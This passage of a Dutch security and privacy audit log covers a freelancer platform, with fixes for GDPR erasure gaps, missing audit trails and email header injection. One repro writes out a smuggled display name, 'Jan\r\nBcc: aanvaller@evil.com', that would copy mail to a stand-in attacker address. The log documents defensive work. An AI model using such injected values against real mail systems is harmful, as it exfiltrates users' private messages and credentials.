  `rejectionReason` → null, de `{ reason }`-auditmetadata → `[verwijderd]`, en de exact gereconstrueerde
  notificatie-body op de ZZP'er-feed. De body-strings staan nu in één gedeelde bron
  (`src/lib/cascade/notification-bodies.ts`, `invoiceRejectedNotificationBody`/`performanceRejectedNotificationBody`),
  gebruikt door zowel de schrijver (`cascade/handlers.ts`) als de erasure — drift-vrij (spiegelt de no-show-/
  shift-handoff-behandeling). Rood→groen: 6 nieuwe erasure-tests + een locked-body-test; volledige gate groen.

### GEDOCUMENTEERD (LAAG) — `TaxFilingRequest` ontbrak het expliciete retentie-spoor

- **Bevinding:** `TaxFilingRequest` was het enige PII-dragende model zonder de "waarom-niet-geraakt"-toelichting die
  elk ander model in de erasure heeft. **Geen live lek:** de rij bevat geen zelf-getypte vrije tekst (`partnerName`
  = naam belastingkantoor, `mandateKind` = enum) en valt onder de fiscale bewaarplicht (7 jaar, art. 52 AWR),
  dezelfde grond (AVG art. 17(3)(b)) die ook Invoice/Expense/Performance-kernvelden bewaart.
- **Fix (deze PR):** expliciete toelichting toegevoegd bij de erasure zodat een volgende pass de rij niet per abuis
  wist of de stilte als omissie leest. De inzage/erasure-asymmetrie (`account-export.ts` toont het, erasure raakt
  het niet) is nu gedocumenteerd rechtmatig.

### Schone oppervlakken (0 bereikbare gaten — 3 parallelle adversariële audits + eigen tracing)

- **IDOR / object-authz (A01):** alle 8 dynamische route-handlers met een client-`id` (documenten, factuur-/
  prestatie-/dossier-/DBA-/modelovereenkomst-PDF, media) + de mutatie-subset van 64 action-files + 22 dynamische
  pagina's: overal `auth → rol → ownership → Zod → actie → audit`, 404-maskering (CWE-203/208), denied-access-audit,
  rate-limit. `e.message` naar client alleen bij getypte `AuthorizationError`/`HttpError` (nooit rauwe Prisma-fout).
- **Cross-tenant / franchiser-isolatie:** elke franchiser-query gescoopt via `tenantScopeWhere`/`ownsViaTenant`
  (tenant uit live-DB `currentActor`, nooit uit een query-param), fail-closed (403 zonder tenant), tenant-suspend
  trekt toegang live in. Geen "link bestaande ZZP'er op id"-pad → geen cross-tenant-koppel-vector.
- **Privacy overige (AVG):** erasure dekt ~30 PII-modellen (de eerder gemelde InvoiceLine/AvailabilityWindow/
  NotificationPreference nu bevestigd afgedekt); logger redacteert PII recursief (test-afgedwongen); k-anonimiteit op
  markttarief (`MARKET_RATE_MIN_SAMPLE = 10`); BIG-verifier minimaliseert derden-doorgifte; lead-retentie 12mnd-sweep.
- **Delta-code zelf (#1197–#1200):** de webhook-`classifyWebhookAuth` is fail-open observability die de control-flow
  nóóit wijzigt (blijft leunen op `resolveWebhookRef`); de nieuwe forecast-/benchmark-/nudge-code is puur/deterministisch,
  scoopt PII strikt op de eigen actor (`userId: actor.id`), lekt geen tegenpartij-PII, en de factuur-forecast is
  `isFreelancerOwner`-gated met een correcte ownership-keten. Geen secrets/PII in de nieuwe observability-/admin-kaarten.

### Geparkeerd (LAAG) — dev-transitieve npm-advisories

- `npm audit` (incl. dev) meldt 6 advisories (deepmerge-ts/prisma-CLI, brace-expansion, js-yaml, esbuild-Windows) —
  allemaal **dev-only DoS/ReDoS**, niet in de productie-runtime (`--omit=dev` = 0). Niet gefixt: `npm audit fix
--force` zou de prisma-CLI-major kunnen breken. Volgen bij de volgende prisma-bump; geen productie-risico.

## Ronde 2026-08-22b (basis: `main` @ 6e5ffd01) — GEEN NIEUWE GATEN (delta + systemische sweep schoon)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken.
Delta t.o.v. de vorige ronde (basis `29a30441`): 6 commits (`29a30441..6e5ffd01`) — o.a. de billing-aflever-
heartbeat / dead-man's-switch betaalprovider (#1190), de notificatie-META-dekking (icoon/label/categorie voor
20 ontbrekende types, #1191), het opdrachtenfilter "alleen waar ik aan voldoe" voor de ZZP'er (#1193), de
concurrentie-context op `/reacties` (#1194) en de Voortgang-stepper-fix (#1195). `npm audit --omit=dev`:
**0 vulnerabilities** (geen advisories over Next.js 15 / Auth.js v5 / Prisma).

**Dekking (OWASP Top 10 / ASVS + AVG):** (1) object-/functie-niveau-autz + IDOR + multi-tenant-isolatie op de
nieuwe billing-heartbeat-, filter- en concurrentie-oppervlakken (A01); (2) injectie (SQL/`$queryRaw`, XSS/
`dangerouslySetInnerHTML`, CSV-/formule-injectie) (A03); (3) SSRF op server-side `fetch` met user-URL (A10);
(4) upload-/storage-veiligheid + path-traversal (A01/A04); (5) secrets in code/log/client-bundle + `.env`-tracking
(A05/A07); (6) auth/sessie/rate-limiting fail-closed (A07); (7) security-headers/CSP-nonce (A05); (8) foutafhandeling
(geen Prisma-fout/stacktrace naar client) (A05/A09); (9) mass-assignment/overposting (A08); (10) AVG: dataminimalisatie

- cross-partij/cross-tenant PII-lek, audit-logging van gevoelige acties, inzage/erasure-symmetrie, k-anonimiteit,
  retentie, logs-lekken-geen-PII, derden-doorgifte (AVG art. 5/15/17/20/25/32).

**Uitkomst — schoon.** Drie parallelle audits + eigen data-flow-tracing vonden **0 bereikbare nieuwe gaten**:

- **Concurrentie-context op `/reacties` (`application-competition.ts`).** De pagina is `requireRole("FREELANCER")`-
  gated en de reacties zijn strikt eigenaar-gescoopt (`freelancerId: profile.id`). De concurrentie-telling
  (`_count.applications` met `freelancerId: { not: profile.id }`, open statussen) is puur **geaggregeerd** — de helper
  leidt uitsluitend een aantal + toon af, lekt geen identiteit, score of reactie van andere kandidaten. AVG art. 5(1)(c)
  dataminimalisatie — schoon.
- **Billing-aflever-heartbeat + recording-payment-provider + `/api/metrics`.** De decorator/heartbeat persisteert/logt
  **geen** PII of secrets — alleen een statische `channel`/`driver`-string + timestamps/booleans/tellers (geverifieerd
  tegen het `BillingDeliveryHeartbeat`-model). De nieuwe billing-gauges dragen **geen labels** (geen per-user/per-invoice
  cardinaliteit-DoS); `checkConnectivity` werpt een HTTP-status-only fout (geen key/endpoint). `/api/metrics` blijft
  fail-closed (503 zonder `CRON_SECRET`, 401 via timing-safe `authorizeCron`), lekt geen Prisma-fout. De admin-heartbeat-
  kaart is SSR + `requireRole("ADMIN")`-gated, rendert geen secret-patroon. CLAUDE.md regel 4/5 — schoon.
- **Opdrachtenfilter "alleen waar ik aan voldoe" + compliance-chip + cascade chain-steps.** Compliance/eligibility
  wordt server-side tegen de eigen credentials van de ingelogde actor berekend (`profile` uitsluitend via
  `userId: actor.id`); geen query-param kan een ander `freelancerId` injecteren. Het `onlyEligible`-in-memory-filter
  opereert alléén op de reeds tenant-gescoopte (`visibleJobsWhere`) resultaatset. De chip toont een generiek label
  (nooit het concrete credential-type/bestand). `buildChainSteps` is een pure weergavefunctie zonder DB/mutatie; de
  ownership-check staat op de samenwerkingspagina vóór de aanroep. A01/server-side-waarheid — schoon.
- **Systemische sweep (voorbij de delta).** Alle 42 `/api`-route-handlers gepoort (`requireActor`/`requireRole`/
  `authorizeCron`); de factuur-/prestatie-/dossier-/DBA-/modelovereenkomst-PDF-routes hebben exemplarische IDOR-
  bescherming (404-maskering CWE-203/208, `auditDeniedAccess` bij weiger én not-found, rate-limit). Franchiser-cross-
  tenant fail-closed via `tenantScopeWhere` (403 zonder tenant) + live-DB `currentActor` (schorsing/anonimisering/
  wachtwoordwijziging/tenant-suspend trekken toegang live in). De agenda-`feed.ics`-bearer-feed: HMAC + `timingSafeEqual`
  - rate-limit vóór DB-I/O + liveness-gate (geschorst/gewist → 404) + forensische audit. AVG-erasure (`anonymizeUser`)
    is `requireRole("ADMIN")`-gated (mens-getriggerd), wist document-bytes + scrubt audit-PII/notificaties/ideeën/credentials.
    Documenten worden uitsluitend via de storage-abstractie geserveerd met `canAccessDocument` (owner/ADMIN); path-traversal
    geblokkeerd in `LocalStorageDriver.resolve`; signed-URL alleen voor niet-gevoelige logo's met geklemde TTL.

## Ronde 2026-08-22 (basis: `main` @ 29a30441) — GEEN NIEUWE GATEN (delta + brede sweep schoon)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken.
Delta t.o.v. de vorige auditronde (basis `ba636008`): commits `ba636008..29a30441` — o.a. de agenda-/
vertrouwens-forensische-trail (#1184), de storage-aflever-heartbeat / dead-man's-switch object-opslag (#1185),
de nieuwe **cron-reminder-taken** kandidaat-beslissing (#1186) + onbeantwoorde-berichten (#1188), start-datum-
sortering (#1187) en de `/api/tasks/run-all`-verzamel-cron. `npm audit --omit=dev`: **0 vulnerabilities**
(250 prod-dependencies, geen advisories over Next.js 15 / Auth.js v5 / Prisma).

**Dekking (OWASP Top 10 / ASVS + AVG):** (1) object-/functie-niveau-autz + IDOR + multi-tenant-isolatie
op de nieuwe reminder-/task-oppervlakken (A01); (2) injectie (SQL/`$queryRawUnsafe`, XSS/`dangerouslySetInnerHTML`,
CSV-/formule-injectie in exports) (A03); (3) SSRF op server-side `fetch` met user-URL (A10); (4) upload-/storage-
veiligheid + path-traversal via de nieuwe recording-storage-driver (A01/A04); (5) secrets in code/log/client-bundle +
`.env`-tracking (A05/A07); (6) auth/sessie/rate-limiting fail-closed op login/register/reset (A07); (7) security-
headers/CSP-nonce-regressie (A05); (8) foutafhandeling (geen Prisma-fout/stacktrace naar client) (A05/A09);
(9) mass-assignment/overposting (`.passthrough()`, body-spread in Prisma) (A08); (10) AVG: dataminimalisatie +
cross-partij/cross-tenant PII-lek in notificatieteksten, audit-logging van gevoelige acties, inzage/erasure-
symmetrie, k-anonimiteit, retentie, logs-lekken-geen-PII, derden-doorgifte (AVG art. 5/15/20/25/32).

**Uitkomst — schoon.** Drie parallelle audits + eigen data-flow-tracing vonden **0 bereikbare nieuwe gaten**:

- **Nieuwe cron-reminder-taken (kandidaat-beslissing + onbeantwoorde-berichten).** Ontvangers zijn strikt
  server-side gescoopt (`job.company.userId` resp. de reeds-bekende `Conversation.participants` minus de afzender);
  notificatie-body bevat **geen derde-partij-PII** — alleen de opdrachttitel (eigen opdracht) + een dagteller resp.
  de afzendernaam die de ontvanger binnen dat gesprek al ziet. **Berichtinhoud wordt bewust nooit geselecteerd of
  ingesloten.** Idempotent (`DomainEvent.dedupeKey`), begrensd (`SCAN_LIMIT=500`), geaudit; geen fan-out-abuse-pad
  (alleen via de CRON_SECRET-poort bereikbaar). AVG art. 5(1)(c) dataminimalisatie — schoon.
- **`/api/tasks/run-all`-verzamel-cron.** Fail-closed: 503 zonder `CRON_SECRET`, 401 via timing-safe `authorizeCron`
  (Bearer-header, geen secret in query/logs) — dezelfde helper als alle 14 andere `/api/tasks/*`-routes. De respons
  bevat alleen taaknamen + tellers; ruwe foutdetails gaan uitsluitend server-side naar de error-reporter. OWASP A01/A07.
- **Recording-storage-driver + storage-aflever-heartbeat.** Pure pass-through-decorator; logt/persisteert **geen**
  document-bytes, object-keys of PII — alleen een statische `channel`/`driver`-string + timestamps/booleans/tellers
  (geverifieerd tegen het `StorageDeliveryHeartbeat`-model). `/api/metrics` blijft geaggregeerde gauges (geen per-user/
  per-object-labels), `CRON_SECRET`-fail-closed; de admin-heartbeat-kaart is SSR + `requireRole("ADMIN")`-gated met
  een regressietest tegen key-patroon-lek in de UI-tekst. CLAUDE.md regel 4/5 — schoon.
- **Brede regressie-sweep.** Geen `$queryRawUnsafe`/`$executeRawUnsafe`; enige `dangerouslySetInnerHTML` is het
  statische theme-script; CSV-exports saneren formule-prefixen via `csv.ts` (`= + @ \t \r -`); SSRF-hosts hardcoded/
  env (Geoapify/DUO/BIG/iDIN), geen user-URL-fetch; open-redirect niet mogelijk (post-login hardcoded `/dashboard`);
  geen `.passthrough()`/body-spread; CSP-nonce + `strict-dynamic` intact; foutroutes geven getypeerde
  `AuthorizationError`-boodschappen, geen Prisma-stacktrace; `anonymizeUser` blijft `requireRole("ADMIN")`-gated.

**Observatie (GEEN security/privacy — UX-categorisatie, doorverwezen naar de functionele/persona-sweep-backlog):**
24 notificatietypes (o.a. `APPLICATION_DECISION_REMINDER`, `PERFORMANCE_SUBMISSION_REMINDER`, `SUBSCRIPTION_RENEWAL`,
`SHIFT_HANDOFF_*`, `NO_SHOW_*`) ontbreken in de `META`-map in `src/lib/notifications.ts` en vallen terug op
`system`/`info` i.p.v. een passende categorie/toon. Puur presentatie/UX (geen data-exposure: de notificatie gaat
nog steeds uitsluitend naar de correcte `userId`); bewust **buiten scope** van deze security/privacy-PR gehouden
(CLAUDE.md regel 7 — geen scope-creep; vereist per-type domeinoordeel). Aanbevolen als eigen kleine UX-PR met een
coverage-test die elk geëmitteerd notificatietype op een niet-fallback `META`-entry afdwingt.

## Ronde 2026-08-21b (basis: `main` @ ba636008) — 2× OPGELOST (forensische trail op publieke bearer-PII-oppervlakken)

Audit: orchestrator (Opus 4.8). Delta t.o.v. de vorige ronde: 4 commits (`50d2c060..ba636008` —
`/api/metrics` scrape-hardening, betaalgedrag-signaal + openstaand-bedrag per opdrachtgever op de
bemiddelaar-lijst, grootste-knelpunt op de opdracht-bereikkaart). `npm audit --omit=dev`: **0 vulnerabilities**.

**Uitkomst delta schoon:** de bemiddelaar-oppervlakken (`franchise/opdrachtgevers/page.tsx` +
`lib/franchise/client-outstanding.ts`) her-scoopen tenant-correct — openstaande facturen worden gefilterd
op `collaboration.companyId ∈ tenantScopeWhere(actor)`-ids, de aggregatie (`clientOutstandingByCompany`,
`poolOutstandingTotals`) is puur over die reeds tenant-gescopet opgehaalde rijen (geen cross-tenant-lek, geen
IDOR). De `/api/metrics`-refactor blijft `CRON_SECRET`-fail-closed en emit alleen geaggregeerde gauges (geen
PII/secrets). **Twee reeds-geparkeerde forensische-trail-gaten op publieke, niet-intrekbare bearer-URL's met
derde-partij-PII gedicht** (zie onder) — AVG art. 5(2) verantwoordingsplicht / OWASP A09.

### OPGELOST — Publieke agenda-feed (`/api/agenda/feed.ics`) liet géén auditspoor na (MIDDEL · OWASP A09 · AVG art. 5(2) · Architectuurregel 5)

**Geschonden regel:** Architectuurregel 5 (audit alles wat telt) / OWASP A09 (Security Logging & Monitoring
Failures) / AVG art. 5(2) (verantwoordingsplicht). De feed-URL draagt een **niet-intrekbaar** bearer-token en
serveert derde-partij-PII (namen van tegenpartijen in het werkrooster), maar riep — als enige gevoelige
weergaveroute — nergens `audit()` aan. Een gelekt/gescraped feed-token was daardoor forensisch onzichtbaar
(alleen ephemere in-memory rate-limit-tellers). De sibling `/vertrouwen`-route logt wél (`TRUST_DOSSIER_VIEWED`).

**Repro (vóór de fix):** haal `GET /api/agenda/feed.ics?u=<userId>&t=<geldig-token>` op vanaf een willekeurig IP
→ 200 met het volledige rooster incl. tegenpartij-namen, zonder enige `AuditLog`-regel. Herhaal vanaf een tweede
IP (gelekt token) → nog steeds geen spoor. Er is geen manier om achteraf vast te stellen welke bron de feed las.

**Fix (dit PR):** nieuwe `src/lib/calendar/feed-audit.ts` (`auditAgendaFeedView`) schrijft ná de token- én
liveness-poort een `AGENDA_FEED_VIEWED`-regel met bron-IP + user-agent. **Gede-dupliceerd per (gebruiker,
bron-IP, kalenderdag)** — externe agenda-apps pollen de feed periodiek, dus per-poll auditen zou de trail
overspoelen; nu wordt élke distincte pollende/scrapende bron precies één keer per dag vastgelegd. Best-effort
(try/catch) zodat een audit-schrijffout de feed nooit breekt. **Test (rood→groen):** `feed-audit.test.ts`
(4× dedup-/schrijf-logica) + uitbreiding `feed.ics/route.test.ts` (4× wiring: 200 logt mét IP+UA, 429/404 loggen
niet, auditfout breekt de feed niet). Zonder de helper bestaat de module niet → rood.

### OPGELOST — `/vertrouwen`-dossier-audit miste `ipAddress`/`userAgent` (LAAG · AVG art. 5(2) volledigheid)

**Geschonden regel:** AVG art. 5(2) (volledigheid van de audit-trail). De `audit()`-aanroep op de publieke,
niet-intrekbare vertrouwensdossier-bearer-URL (naam + certificaten = derde-partij-PII) gaf `ipAddress`/
`userAgent` **niet** mee, terwijl `AuditEntry` het ondersteunt, de IP al voor de rate-limiter werd berekend, en
andere publieke flows (`wachtwoord-vergeten`) `...meta` al meesturen. De scraping-bron van deze URL was zo
niet-herleidbaar.

**Repro (vóór de fix):** open `/vertrouwen/<profileId>/<token>` → `TRUST_DOSSIER_VIEWED` wordt gelogd, maar met
`ipAddress = null`, `userAgent = null`.

**Fix (dit PR):** `page.tsx` leest nu ook `userAgent` uit `requestMeta()` en geeft `ipAddress`/`userAgent` mee
aan de bestaande `audit()`-aanroep. **Test (rood→groen):** uitbreiding `vertrouwen-liveness.test.ts` — assert
dat de audit `ipAddress`/`userAgent` draagt; zonder de fix zijn ze afwezig → rood.

## Ronde 2026-08-21 (basis: `main` @ b32f50d5) — 1× OPGELOST (inzage/erasure-asymmetrie: NotificationPreference)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1) authz/IDOR/functie-autorisatie + multi-tenant-isolatie, (2) injectie/SSRF/upload/secrets/headers/CSP/
open-redirect/CSRF + `npm audit`, (3) privacy/AVG (erasure↔export-symmetrie via volledige schema-modelsweep,
dataminimalisatie/PII-over-fetch, cross-party/cross-tenant, audit-logging, k-anonimiteit, retentie, derden),
(4) auth/sessie/tokens/rate-limiting/CSRF/mass-assignment/account-status. Delta t.o.v. de vorige ronde:
5 commits (`c6bce01e..b32f50d5` — e-mail-CRLF-fix + 2× erasure, dispute-escalatie-detector, ZZP-etalage
vaardigheidsfilter, renewal-badge op /samenwerkingen, betaalgedrag-CSV-export). `npm audit`: **0 vulnerabilities**.

**Uitkomst:** authz/IDOR/tenant-isolatie **schoon** (documenten/dossiers/DBA-PDF/cascade-geld-mutaties/
franchise-oversight/admin-gating getraceerd — geen object-level/IDOR/cross-tenant-gat). Injectie/SSRF/
upload/secrets **schoon** (CSV/ICS/e-mail-header-saneringen consistent toegepast, geen `$queryRawUnsafe`,
SSRF-hosts hardcoded, uploads magic-byte-gevalideerd, geen gecommitte secrets). Auth/sessie/headers **schoon**
(live-DB-herverificatie, reset-token 256-bit/eenmalig/1u, rate-limiters fail-closed, geen mass-assignment,
SameSite=Lax + strict-CSP-nonce, geen open redirect). Privacy/AVG vond **1× MIDDEL** inzage/erasure-asymmetrie
(hieronder OPGELOST) + 2 reeds-geparkeerde FG-items herbevestigd (KvK op publiek profiel; TaxFilingRequest-erasure).

### OPGELOST — `NotificationPreference` ontbrak in `buildAccountExport` terwijl erasure het wist (MIDDEL · AVG art. 15/20 · CLAUDE.md regel 5)

**Geschonden regel:** AVG art. 15/20 (inzage/portabiliteit) — een door de betrokkene zélf gemaakte keuze
(per e-mailcategorie opt-out) is een eigen persoonsgegeven en moet in de zelf-export zichtbaar zijn. De
erasure wist het wél (`anonymizeUser` → `notificationPreference.deleteMany`, `admin/gebruikers/actions.ts:693`),
dus een inzage/erasure-asymmetrie: het platform verwerkt het gegeven, verwijdert het op verzoek, maar toont
het niet in de inzage. Zelfde asymmetrie-klasse als de reeds-gefixte InvoiceLine/AvailabilityWindow/SavedJob.

**Repro (vóór de fix):** een gebruiker zet op `/instellingen` een e-mailcategorie (bv. `payment`/`invoice`/
`vat`/`dba`) uit → er ontstaat een `NotificationPreference`-rij (`category`, `emailEnabled=false`). Bij een
inzageverzoek via `GET /api/account/export` (`buildAccountExport`) ontbreekt elke `notificationPreferences`-
sectie — de gebruiker kan zijn eigen opt-out-keuzes niet inzien of meenemen (portabiliteit), terwijl ze wel
zijn opgeslagen en op verzoek worden gewist.

**Fix (dit PR):** `buildAccountExport` (`src/lib/account-export.ts`) leest nu
`notificationPreference.findMany({ where: { userId: actorId }, select: { category, emailEnabled, createdAt,
updatedAt } })` en neemt het op als `notificationPreferences` in de payload/interface — strikt gescopet op de
eigen `userId` (spiegel van `pushSubscriptions`, óók een eigen kanaalrecord). **Tests (rood→groen):**
`account-export.test.ts` — de present-keys-lus eist nu `notificationPreferences`, en een nieuwe scoping-test
asserteert `where.userId === actor` + de smalle select (rood zonder de bronwijziging: de `notificationPreference`-
call ontbreekt in de fake-Prisma-calllijst → `find(...) === undefined`).

## Ronde 2026-08-20 (basis: `main` @ a84aad94) — 3× OPGELOST (e-mail-CRLF-injectie + 2× erasure-restanten)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1) authz/IDOR/functie-autorisatie + multi-tenant-isolatie, (2) injectie/SSRF/upload/secrets/headers/CSP/
open-redirect/CSRF + `npm audit`, (3) privacy/AVG (erasure↔export-symmetrie via volledige schema-modelsweep,
dataminimalisatie/PII-over-fetch, cross-party/cross-tenant, audit-logging, k-anonimiteit, retentie, derden),
(4) auth/sessie/tokens/rate-limiting/CSRF/mass-assignment/account-status. Delta t.o.v. de vorige
ronde: 6 nieuwe commits (`f598d699..a84aad94` — flexpool-strip, samenwerking-dubbelboek-signaal,
franchise-cascade-KPI, PAST_DUE-downgrade-detector, revenue-trend-fix, voorstel-ouderdomssignaal).
Runtime-probe niet gedraaid — statisch grep+lees was voldoende gezien de codebase al door ~30 ronden is
uitgehard en de delta pure read-side aggregaties bevatte.

**Uitkomst:** authz/IDOR/tenant-isolatie, auth/sessie/tokens en de delta **schoon** — géén nieuwe
KRITIEK/HOOG in die oppervlakken. Injectie-audit vond **1× MIDDEL** (e-mail-header-CRLF-injectie via
ongesaneerde weergavenaam, CWE-93). Privacy-audit vond **2× erasure-restanten** (1× MIDDEL:
`InvoiceLine.description` + 1× LAAG–MIDDEL: rest van `AvailabilityWindow` naast `note`). Alle drie
gefixt in dit PR met bijbehorende rood→groen-tests.

### OPGELOST — E-mail-header-/CRLF-injectie via ongesaneerde weergavenaam (MIDDEL · CWE-93 · OWASP A03 Injection)

**Geschonden regel:** CLAUDE.md architectuurregel 1 (server-side is de waarheid): de mail-sink krijgt
een `to`-string die uit gebruiker-gecontroleerde profieldata (`User.name`, `Company.name`) is opgebouwd
zonder saneringslaag; de laag mag geen ruwe stuurtekens naar de mail-driver doorgeven.

**Repro (vóór de fix):** een gebruiker zet zijn `User.name` op `"Jan\r\nBcc: aanvaller@evil.com"` (het
Zod-schema `trimmed(120)` in `src/lib/validation.ts` knipt alleen rand-witruimte; ingebedde CR/LF komt
er ongemoeid door). Bij de volgende herinnerings-/welkomstmail bouwt `recipient()`/`to()` in
`src/lib/services/{reminder-emails,cascade-emails}.ts` en `src/lib/onboarding/welcome-email.ts` de
`to`-string via `` `${name} <${email}>` `` — de CR/LF gaat rechtstreeks naar
`MailMessage.to`. De SMTP-driver (`nodemailer.sendMail({ to })`) is de klassieke vector: een CR/LF in
het display-name-deel kan een extra header of ontvanger smokkelen (`Bcc:` → stille exfiltratie van de
mailinhoud, incl. het tijdelijke wachtwoord uit `buildWelcomeEmail`). De JSON-API-drivers
(Resend/Postmark/SES) sturen 'm als string-waarde — geen directe on-the-wire header — maar geven wel
ongesaneerde input aan een externe address-parser door.

**Fix (dit PR):** nieuwe pure helper `src/lib/services/email-address.ts` (met test) —
`sanitizeDisplayName` verwijdert de C0-reeks (`\x00-\x1F` incl. CR/LF/tab) + DEL + `<`/`>`/`"`;
`formatEmailRecipient` bouwt `"<gesaneerde naam> <email>"` (of alleen het adres) en saneert het adres
ook (defense-in-depth naast `z.string().email()`). De drie recipient-builders (`reminder-emails.ts`,
`cascade-emails.ts`, `welcome-email.ts`) delegeren nu naar deze helper — sink-laag-verdediging in
lijn met `escapeCsvField` (CSV-formule), `escapeIcsText` (RFC 5545) en `sanitizeAttachmentFilename`
(Content-Disposition) elders in de codebase. **Tests (10, rood→groen):** injectiepogingen produceren
nooit een CR/LF in de uitvoer; adres-delimiters `<`/`>` verlaten het display-name-deel; adres-sanering
dekt óók een CR/LF in het adres.

### OPGELOST — `InvoiceLine.description` (zelf-getypte vrije tekst) overleefde erasure én ontbrak in export (MIDDEL · AVG art. 15/17/20 · CLAUDE.md regel 5)

**Geschonden regel:** AVG art. 17 (recht op vergetelheid) — zelf-getypte vrije tekst van de betrokkene
mag na een verwijderverzoek niet permanent leesbaar blijven; art. 15/20 (inzage/portabiliteit) — de
uitschrijver kon zijn eigen regelomschrijvingen niet inzien/exporteren. Zelfde erasure-gap-klasse als
de reeds-gefixte `Application.motivation`/`Expense.description`/`Performance.description`.

**Repro (vóór de fix):** ZZP'er maakt een handmatige/cascade-factuur met een regel-omschrijving als
`"Werkzaamheden bij mevr. De Vries, Julianalaan 12, 06-xxxxxxx"` (200 tekens vrije tekst per regel via
`invoiceLineSchema`) → admin roept `anonymizeUser(freelancerId)` aan → `InvoiceLine`-rijen worden
nergens door de 812-regel-erasure-transactie geraakt (alleen `ownCreditedInvoices` — cascade
`lifecycleStatus: "CREDITED"`-facturen — krijgen hun `rejectionReason` gescrubd; legacy-loose-facturen
dragen geen `issuerUserId` en vallen dáár al buiten) → de vrije tekst blijft permanent leesbaar voor
de opdrachtgever + admin, gekoppeld aan de behouden `Collaboration.freelancerId`. Spiegelbeeldig
ontbrak `Invoice.lines` in `buildAccountExport` (art. 15/20).

**Fix (dit PR):**

- Nieuwe `prisma.invoiceLine.updateMany` in de anonimiseringstransactie: `data:
  { description: "[Verwijderd op verzoek van de gebruiker]" }` (non-nullable String → neutrale
  redactiestring, spiegel `Expense.description`/`Performance.description`). Gescopet op de EIGEN
  uitschrijver-facturen: `{ invoice: { OR: [{ issuerUserId: userId }, { collaboration: { freelancer:
{ userId } } }] } }` (cascade + legacy-loose). Een opdrachtgever die enkel tegenpartij is
  (`counterpartyUserId`) schrijft deze tekst niet, dus die scope blijft er bewust uit.
- `buildAccountExport` — invoice-select uitgebreid met `lines: { description, quantity, unitCents,
amountCents }` + hulpvelden `issuerUserId` en `collaboration.freelancer.userId`; per-rij JS-filter na
  de DB-lezing houdt `lines` alleen op de eigen uitschrijver-facturen (spiegel van de erasure-scoping)
  en stript de hulpvelden uit het uiteindelijke payload-object. Zo landen de zelf-getypte
  omschrijvingen bij de uitschrijver in de eigen inzage-export zonder ze aan een enkel-tegenpartij-
  opdrachtgever te lekken.
- **Tests (rood→groen):** `anonymize-erasure.test.ts` — nieuwe case asserteert de `invoiceLine.updateMany`-
  scope en de redactiestring (rood zonder de bronwijziging: `find(...) === undefined`);
  `account-export.test.ts` — nieuwe case bewijst met drie canned facturen (eigen cascade, legacy loose,
  enkel-tegenpartij) dat `lines` correct wél/niet wordt meegegeven én dat de hulpvelden nooit in het
  payload-object lekken; bestaande "geen tegenpartij-vrije-tekst"-test aangepast om te bevestigen dat
  `issuerUserId`/`lines` nu WEL in het query-select zitten (nodig voor de JS-filter) maar niet in de
  uiteindelijke payload.

### OPGELOST — `AvailabilityWindow` datums/type/uren overleefden erasure; export gefilterd op `note !== null` (LAAG–MIDDEL · AVG art. 15/17/20 · CLAUDE.md regel 5)

**Geschonden regel:** AVG art. 17 — een eerdere ronde redacteerde alleen `note` (vrije tekst met
reden/medische details, bv. "ziek") maar liet `startDate`/`endDate`/`type`/`hoursPerWeek` staan als
gedragsmetadata over de betrokkene (een patroon van UNAVAILABLE-vensters kan omstandigheden prijsgeven),
gekoppeld aan de behouden `FreelancerProfile.id` (die admin kan mappen). Geen tegenpartij-/fiscale
bewaargrond (anders dan `Invoice`/`Expense`/`Performance`). Spiegelbeeldig art. 15/20 gap: de export
scope'te op `where: { note: { not: null } }` en select had geen `hoursPerWeek` → de betrokkene kreeg de
datums/uren-historie niet in de eigen inzage-export.

**Fix (dit PR):**

- `anonymizeUser`: `prisma.availabilityWindow.deleteMany({ where: { freelancerProfile: { userId } } })`
  in plaats van de partiële `updateMany({ data: { note: null } })` — spiegel van `WorkExperience`/
  `SavedJob` ("geen tegenpartij-waarde → hard delete").
- `buildAccountExport`: note-filter uit het `where` gehaald + `hoursPerWeek` toegevoegd aan het select
  → volledige agenda-historie in de export.
- **Tests (rood→groen):** `anonymize-erasure.test.ts` — bestaande test aangepast om de nieuwe
  `deleteMany` te asserteren én expliciet te bewijzen dat de oude `updateMany` niet meer draait;
  `account-export.test.ts` — nieuwe test asserteert het weggenomen note-filter + de aanwezigheid van
  `hoursPerWeek` in het select.

## Ronde 2026-08-20 (basis: `main` @ f598d699) — 1× HOOG + 2× consistentie OPGELOST (bookmark-gedragsmetadata overleefde erasure)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1) authz/IDOR/functie-autorisatie + multi-tenant-isolatie, (2) injectie/SSRF/upload/secrets/headers/CSP/
open-redirect/CSRF + `npm audit`, (3) privacy/AVG (erasure↔export-symmetrie via volledige schema-modelsweep,
dataminimalisatie/PII-over-fetch, cross-party/cross-tenant, audit-logging, k-anonimiteit, retentie, derden).

Extra orchestrator-probes op de delta `126505f6..f598d699` (11 commits: relatie-/certificaat-/factuurregister-
CSV-exports, ICS-agenda-feed + VALARM-deadlines, factuur-PDF IBAN-blok, billing-webhook-refactor,
subscription-reconcile-cron):

- **CSV-exports** (`relation-breakdown-csv`, `collaboration-compliance-csv`, `invoice-register-csv`) — alle
  vrije-tekst (bedrijfs-/ZZP'er-namen, opdrachttitels) loopt via `escapeCsvField` (CWE-1236 formule-guard op
  `= + @ \t \r` + negatief-getal-uitzondering + RFC-4180-quoting). De twee nieuwe routes: `requireActor` →
  rol-gate (FREELANCER/CLIENT resp. CLIENT-only) → `exportRateLimiter` → owner-gescoopte fetch → auditregel.
  Schoon.
- **ICS-feed** (`calendar/ics.ts` + `deadlines.ts`, `api/agenda/feed.ics`) — `escapeIcsText` dekt RFC 5545
  §3.3.11 (`\ ; ,` + CRLF→`\n`, losse `\r` weg); UID/DTSTAMP server-gegenereerd → geen CRLF/property-injectie.
  De publieke bearer-feed: rate-limit (IP|userId) → HMAC-tokenverificatie → live liveness-poort (SUSPENDED/
  `anonymizedAt` → 404) vóór elke DB-I/O. Schoon.
